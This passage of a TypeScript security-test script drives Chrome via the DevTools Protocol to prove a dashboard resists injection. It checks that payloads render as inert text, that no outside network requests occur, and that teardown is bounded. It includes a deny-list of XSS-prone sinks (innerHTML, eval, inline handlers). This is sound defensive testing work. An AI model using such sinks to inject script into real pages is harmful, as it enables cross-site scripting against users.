    cdp = await CdpClient.connect(page.webSocketDebuggerUrl, { signal: controller.signal });
    const pageErrors: string[] = [],consoleErrors: string[] = [],requests: string[] = [];
    cdp.on("Runtime.exceptionThrown", (params) => pageErrors.push(JSON.stringify(params)));
    cdp.on("Runtime.consoleAPICalled", (params) => { if (params.type === "error" || params.type === "assert") consoleErrors.push(JSON.stringify(params)) });
    cdp.on("Log.entryAdded", (params) => {
      const entry = params.entry as { level?: string; text?: string } | undefined;
      if (entry?.level === "error") consoleErrors.push(entry.text ?? JSON.stringify(entry));
    });
    cdp.on("Network.requestWillBeSent", (params) => {
      const request = params.request as { url?: string } | undefined;if (request?.url) requests.push(request.url);
    });
    await Promise.all([cdp.send("Page.enable"), cdp.send("Runtime.enable"), cdp.send("Network.enable"), cdp.send("Log.enable")]);

    const observations: string[] = [];
    for (const viewport of [{ name: "desktop", width: 1280, height: 900, mobile: false }, { name: "mobile", width: 390, height: 844, mobile: true }]) {
      await cdp.send("Emulation.setDeviceMetricsOverride", { width: viewport.width, height: viewport.height, deviceScaleFactor: 1, mobile: viewport.mobile });
      await cdp.send("Page.navigate", { url: `${base}/` });
      await waitForText(cdp, payloads.html, controller.signal);
      observations.push(await evaluate<string>(cdp, "document.body.textContent"));
      await evaluate(cdp, `openSession(${JSON.stringify(snapshotFixture.sessions[0].sessionId)})`, true);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      await evaluate(cdp, `openRepo(${JSON.stringify(snapshotFixture.repos[0].repoHash)})`, true);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      await evaluate(cdp, "loadSettings()", true);
      observations.push(await evaluate<string>(cdp, `document.querySelector('#settings').textContent + [...document.querySelectorAll('#settings input, #settings option')].map(element=>element.value).join(' ')`));
      await evaluate(cdp, `(async()=>{
        const inputs=[...document.querySelectorAll('#s-accounts input')];
        inputs[0].value=${JSON.stringify(payloads.unicode)};
        inputs[1].value='browser-proof@example.invalid';
        await saveAccountRow('sha256:securityproofaccount',inputs[0],inputs[1]);
        await mergeAccount('sha256:securityproofaccount','sha256:securityproofcanonical');
        await removePrio(${JSON.stringify(payloads.url)});
        await removeSub(0);
        return true;
      })()`, true);
      await evaluate(cdp, `window.__plimsollDashboardTest.drawerError('fixture',new Error(${JSON.stringify(payloads.unicode)}))`);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      const domAudit = await evaluate<{
        handlers: number; urlAttributes: number; activeNodes: number; interactiveRows: number; dialogs: number; testHook: boolean; viewport: number;
      }>(cdp, `({
        handlers:document.querySelectorAll('[onclick],[onchange],[onerror],[onload],[onfocus],[onbegin]').length,
        urlAttributes:document.querySelectorAll('[src],[href],[srcdoc]').length,
        activeNodes:document.querySelectorAll('iframe,object,embed,img,link,base,form').length,
        interactiveRows:document.querySelectorAll('tr.row[tabindex="0"]').length,
        dialogs:document.querySelectorAll('[role="dialog"][aria-modal="true"]').length,
        testHook:Boolean(window.__plimsollDashboardTest),
        viewport:document.documentElement.clientWidth
      })`);
      check(
        `browser_${viewport.name}_dom_inert`,
        domAudit.handlers === 0 &&
          domAudit.urlAttributes === 0 &&
          domAudit.activeNodes === 0 &&
          domAudit.interactiveRows >= 2 &&
          domAudit.dialogs === 2 &&
          domAudit.testHook &&
          domAudit.viewport <= viewport.width &&
          domAudit.viewport >= viewport.width - 20,
        JSON.stringify(domAudit),
      );
    }
    const observed = observations.join("\n");
    check(
      "browser_payloads_render_as_text",
      Object.values(payloads).every((payload) => observed.includes(payload)),
      JSON.stringify(Object.fromEntries(Object.entries(payloads).map(([name, payload]) => [name, observed.includes(payload)]))),
    );
    const outsideRequests = requests.filter((url) => !url.startsWith(base));
    check("browser_zero_network_exfiltration", requests.length >= 8 && outsideRequests.length === 0, JSON.stringify({ requests: requests.length, outsideRequests }));
    const mutationRoutes = new Set(mutations.map((entry) => entry.route));
    check(
      "browser_settings_edits_preserved",
      ["/api/settings/account-label", "/api/settings/account-email", "/api/settings/account-merge", "/api/settings/priority", "/api/settings/subscriptions"]
        .every((route) => mutationRoutes.has(route)),
      JSON.stringify({ requests: mutations.length, routes: [...mutationRoutes] }),
    );
    check("browser_zero_page_console_errors", pageErrors.length === 0 && consoleErrors.length === 0, JSON.stringify({ pageErrors, consoleErrors }));
  })();
  try {
    await runWithBrowserWatchdog({
      operation,
      controller,
      cleanup,
      timeoutMs: BROWSER_PROOF_WALL_MS,
    });
  } finally {
    await cleanup();
  }
  check(
    "browser_process_bounded_teardown",
    shutdownReceipt?.exited === true &&
      shutdownReceipt.durationMs <= BROWSER_PROTOCOL_CLOSE_MS * 2 + BROWSER_SIGNAL_GRACE_MS * 2 + 500 &&
      childHasExited(chrome) &&
      !fs.existsSync(profile) &&
      cdp?.pendingCount === 0 &&
      serverClosed,
    JSON.stringify({
      shutdownReceipt,
      processExited: childHasExited(chrome),
      profileRemoved: !fs.existsSync(profile),
      pendingCommands: cdp?.pendingCount ?? 0,
      serverClosed,
    }),
  );
}

async function main() {
  if (process.env.PLIMSOLL_DASHBOARD_TIMEOUT_EXIT_FIXTURE === "1") {
    const fixtureRoot = process.env.PLIMSOLL_DASHBOARD_TIMEOUT_FIXTURE_ROOT;
    if (!fixtureRoot || !fs.existsSync(fixtureRoot)) throw new Error("timeout_fixture_root_missing");
    const scenario = await runNeverResolvingCdpScenario(fixtureRoot);
    if (scenario.timeoutError instanceof ProofTimeoutError) throw scenario.timeoutError;
    throw new Error("timeout_fixture_did_not_timeout");
  }
  const html = fs.readFileSync(dashboardPath, "utf8"),script = inlineBlock(html, "script");
  const forbidden = [
    ["innerHTML", /\binnerHTML\b/], ["outerHTML", /\bouterHTML\b/], ["insertAdjacentHTML", /\binsertAdjacentHTML\b/],
    ["document.write", /document\.write/], ["inline handler", /\son[a-z]+\s*=/i], ["style attribute", /\sstyle\s*=/i],
    ["style property", /\.style\s*[.=]/], ["eval", /\beval\s*\(/], ["Function constructor", /\bnew\s+Function\b/],
    ["URL-bearing markup", /\s(?:src|href|srcdoc|xlink:href)\s*=/i],
  ] as const;
  const hits = forbidden.filter(([, pattern]) => pattern.test(html)).map(([name]) => name);
  check("static_forbidden_sinks_absent", hits.length === 0, JSON.stringify({ hits }));
  let parseError: string | null = null;
  try { new Function(script); } catch (error) { parseError = String(error) }
  check("dashboard_script_parses", script.length > 5_000 && parseError === null, parseError ?? `script bytes=${Buffer.byteLength(script)}`);
  check(
    "safe_dom_layer_present",
    html.includes("textContent") && html.includes("createElement") && html.includes("createElementNS") && html.includes("addEventListener") && html.includes("replaceChildren"),
    "textContent/createElement/createElementNS/addEventListener/replaceChildren",
  );
  await proveBoundedSignalEscalation();
  await proveNeverResolvingCdpCleanup();
  proveTimeoutExitSurface();
  await actualServerHeaderProof();
  await browserProof(html);
  const failed = checks.filter((receipt) => !receipt.passed);
  console.log(JSON.stringify({ proof: "dashboard-security", checks: checks.length, passed: checks.length - failed.length, failed: failed.map((receipt) => receipt.name) }));
  if (failed.length) process.exitCode = 1;
}

main().catch((error) => {
  if (error instanceof ProofTimeoutError) {
    console.error(JSON.stringify({
      proof: "dashboard-security",
      error: "proof_timeout",
      stage: error.stage,
    }));
  } else {
    console.error(error instanceof Error ? error.stack : String(error));
  }
  process.exitCode = 1;
});
